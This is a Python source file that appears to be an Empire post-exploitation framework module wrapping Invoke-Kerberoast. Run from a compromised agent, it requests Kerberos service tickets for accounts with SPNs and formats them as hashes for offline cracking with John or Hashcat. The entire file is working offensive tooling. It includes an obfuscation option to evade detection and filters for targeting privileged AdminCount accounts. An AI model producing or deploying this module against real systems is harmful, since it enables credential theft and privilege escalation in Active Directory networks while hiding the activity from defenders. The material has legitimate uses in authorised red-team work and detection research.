from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-Kerberoast',

            'Author': ['@harmj0y', '@machosec'],

            'Description': ('Requests kerberos tickets for all users with a non-null service principal name (SPN) and extracts them into a format ready for John or Hashcat.'),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/',
                'https://gist.github.com/HarmJ0y/53a837fce877e32e18d78acbb08c8fe9'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Identity' : {
                'Description'   :   'Specific SamAccountName, DistinguishedName, SID, or GUID to kerberoast.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'AdminCount' : {
                'Description'   :   'Kerberoast privileged accounts protected by AdminSDHolder.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Domain' : {
                'Description'   :   'Specifies the domain to use for the query, defaults to the current domain.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'LDAPFilter' : {
                'Description'   :   'Specifies an LDAP query string that is used to filter Active Directory objects.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SearchBase' : {
                'Description'   :   'The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local".',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Server' : {
                'Description'   :   'Specifies an Active Directory server (domain controller) to bind to.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SearchScope' : {
                'Description'   :   'Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'OutputFormat' : {
                'Description'   :   "Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.",
                'Required'      :   False,
                'Value'         :   'John'
            }

        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        moduleName = self.info['Name']
        
        # read in the common powerview.ps1 module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Kerberoast.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode
        scriptEnd = "\nInvoke-Kerberoast "

        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " " + str(values['Value']) 

        scriptEnd += '| fl | Out-String | %{$_ + \"`n\"};"`n'+str(moduleName)+' completed!"'
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
